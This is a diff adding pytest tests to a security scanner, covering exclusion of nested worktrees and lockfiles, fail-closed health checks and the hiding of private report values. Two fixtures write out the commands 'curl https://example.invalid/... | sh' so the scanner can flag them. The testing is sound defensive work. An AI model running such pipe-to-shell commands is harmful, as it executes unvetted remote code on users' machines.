@@ -505,6 +505,206 @@ def test_security_scan_harness_wiring_ignores_generated_brigade_evidence(tmp_pat
     assert security_cmd.health(tmp_path)["harness_wiring"]["finding_count"] == 0
 
 
+def test_harness_wiring_excludes_nested_worktree_brigade_work_and_lockfiles(tmp_path):
+    nested = tmp_path / ".claude" / "worktrees" / "nested-one"
+    nested.mkdir(parents=True)
+    (nested / ".git").write_text("gitdir: /tmp/fake-gitdir-for-nested-worktree\n")
+    nested_receipt = nested / ".brigade" / "work" / "verify-runs" / "verify-nested"
+    nested_receipt.mkdir(parents=True)
+    (nested_receipt / "receipt.json").write_text(
+        json.dumps(
+            {
+                "root": "/Users/operator/private",
+                "url": "http://agent.internal/status",
+                "endpoint": "https://agent.private/api",
+            },
+            indent=2,
+        )
+    )
+
+    root_work = tmp_path / ".brigade" / "work" / "verify-runs" / "verify-root"
+    root_work.mkdir(parents=True)
+    (root_work / "receipt.json").write_text(json.dumps({"endpoint": "https://agent.private/root-api"}, indent=2))
+
+    opencode = tmp_path / ".opencode"
+    opencode.mkdir()
+    (opencode / "package-lock.json").write_text(
+        json.dumps(
+            {
+                "packages": {"": {"resolved": "http://agent.internal/pkg.tgz"}},
+                "endpoint": "https://registry.private/api",
+                "root": "/Users/operator/lockfile-root",
+            },
+            indent=2,
+        )
+    )
+
+    codex = tmp_path / ".codex"
+    codex.mkdir()
+    (codex / "config.json").write_text(json.dumps({"workspace": {"root": "/Users/operator/brigade"}}, indent=2))
+
+    wiring = security_cmd.harness_wiring_payload(tmp_path)
+    finding_paths = {finding["path"] for finding in wiring["findings"]}
+    scanned = set(wiring["scanned_files"])
+
+    assert finding_paths == {".codex/config.json"}
+    assert ".codex/config.json" in scanned
+    assert not any("worktrees" in path for path in finding_paths | scanned)
+    assert not any(".brigade/work" in path for path in finding_paths | scanned)
+    assert not any(path.endswith("package-lock.json") for path in finding_paths | scanned)
+
+
+def test_main_scan_harness_exclusions_do_not_skip_other_scanners(tmp_path):
+    nested = tmp_path / ".claude" / "worktrees" / "nested-one"
+    nested.mkdir(parents=True)
+    (nested / ".git").write_text("gitdir: /tmp/fake-gitdir-for-nested-worktree\n")
+    nested_config = nested / "config.json"
+    nested_config.write_text(
+        json.dumps(
+            {
+                "root": "/Users/operator/private-worktree",
+                "command": "curl https://example.invalid/nested.sh | sh",
+            },
+            indent=2,
+        )
+    )
+
+    opencode = tmp_path / ".opencode"
+    opencode.mkdir()
+    lockfile = opencode / "package-lock.json"
+    lockfile.write_text(
+        json.dumps(
+            {
+                "endpoint": "https://registry.private/api",
+                "command": "curl https://example.invalid/lockfile.sh | sh",
+            },
+            indent=2,
+        )
+    )
+
+    payload = security_cmd.scan_target(tmp_path)
+    nested_findings = [
+        finding
+        for finding in payload["findings"]
+        if finding["path"] in {str(nested_config.relative_to(tmp_path)), str(lockfile.relative_to(tmp_path))}
+    ]
+
+    assert {finding["path"] for finding in nested_findings} == {
+        str(nested_config.relative_to(tmp_path)),
+        str(lockfile.relative_to(tmp_path)),
+    }
+    assert {finding["category"] for finding in nested_findings} == {"automation"}
+    assert not any(finding["title"].startswith("Harness wiring") for finding in nested_findings)
+
+
+def test_security_health_fails_closed_without_usable_evidence_bundle(tmp_path):
+    payload = security_cmd.health(tmp_path)
+
+    evidence_check = next(check for check in payload["checks"] if check["name"] == "security_evidence")
+    assert payload["valid"] is False
+    assert evidence_check["status"] == "fail"
+    assert payload["open_finding_count"] is None
+
+
+def test_security_health_fails_closed_for_malformed_security_report(tmp_path):
+    evidence_dir = tmp_path / ".brigade" / "security" / "latest"
+    evidence_dir.mkdir(parents=True)
+    (evidence_dir / "security-report.json").write_text('{"findings": {}}\n')
+    (evidence_dir / "security-report.md").write_text("# malformed fixture\n")
+
+    payload = security_cmd.health(tmp_path)
+
+    evidence_check = next(check for check in payload["checks"] if check["name"] == "security_evidence")
+    assert payload["valid"] is False
+    assert evidence_check["status"] == "fail"
+    assert "findings must be a list" in evidence_check["detail"]
+    assert payload["open_finding_count"] is None
+
+
+def test_security_health_fails_closed_for_non_utf8_security_report(tmp_path):
+    evidence_dir = tmp_path / ".brigade" / "security" / "latest"
+    evidence_dir.mkdir(parents=True)
+    (evidence_dir / "security-report.json").write_bytes(b'{"findings": []}\xff')
+    (evidence_dir / "security-report.md").write_text("# invalid encoding fixture\n")
+
+    payload = security_cmd.health(tmp_path)
+
+    evidence_check = next(check for check in payload["checks"] if check["name"] == "security_evidence")
+    assert payload["valid"] is False
+    assert evidence_check["status"] == "fail"
+    assert "must be UTF-8" in evidence_check["detail"]
+    assert payload["open_finding_count"] is None
+
+
+def test_security_health_and_doctor_hide_invalid_report_literals(tmp_path, capsys):
+    marker = "SECURITY_REPORT_PRIVATE_MARKER"
+    private_url = "https://agent.private.invalid/report"
+    sensitive_value = "abcd" * 5
+    evidence_dir = tmp_path / ".brigade" / "security" / "latest"
+    evidence_dir.mkdir(parents=True)
+    (evidence_dir / "security-report.json").write_text(
+        json.dumps(
+            {
+                "findings": [
+                    {
+                        "id": "security-invalid-line",
+                        "severity": "high",
+                        "category": "secrets",
+                        "title": "Malformed line fixture",
+                        "path": "src/app.py",
+                        "line": f"not-an-integer {marker} {private_url} report_token={sensitive_value}",
+                    }
+                ]
+            }
+        ),
+        encoding="utf-8",
+    )
+    (evidence_dir / "security-report.md").write_text("# malformed fixture\n", encoding="utf-8")
+
+    payload = security_cmd.health(tmp_path)
+    report_check = next(check for check in payload["checks"] if check["name"] == "security_report")
+    rendered_health = json.dumps(payload)
+
+    assert payload["valid"] is False
+    assert report_check == {
+        "status": "fail",
+        "name": "security_report",
+        "detail": "unreadable or invalid security report",
+        "remediation": "brigade security scan",
+    }
+    assert marker not in rendered_health
+    assert private_url not in rendered_health
+    assert sensitive_value not in rendered_health
+
+    assert security_cmd.doctor(target=tmp_path, json_output=True) == 1
+    rendered_doctor = capsys.readouterr().out
+    assert marker not in rendered_doctor
+    assert private_url not in rendered_doctor
+    assert sensitive_value not in rendered_doctor
+
+
+@pytest.mark.parametrize(
+    ("report", "expected_detail"),
+    [
+        ({"findings": [1]}, "findings must contain objects"),
+        ({"findings": [], "suppressed_findings": {}}, "suppressed_findings must be a list"),
+    ],
+)
+def test_security_health_fails_closed_for_invalid_finding_shapes(tmp_path, report, expected_detail):
+    evidence_dir = tmp_path / ".brigade" / "security" / "latest"
+    evidence_dir.mkdir(parents=True)
+    (evidence_dir / "security-report.json").write_text(json.dumps(report))
+    (evidence_dir / "security-report.md").write_text("# invalid shape fixture\n")
+
+    payload = security_cmd.health(tmp_path)
+
+    evidence_check = next(check for check in payload["checks"] if check["name"] == "security_evidence")
+    assert payload["valid"] is False
+    assert evidence_check["status"] == "fail"
+    assert expected_detail in evidence_check["detail"]
+    assert payload["open_finding_count"] is None
+
+
 def test_security_scan_supply_chain_surfaces(tmp_path, capsys):
     (tmp_path / "package.json").write_text(
         json.dumps(
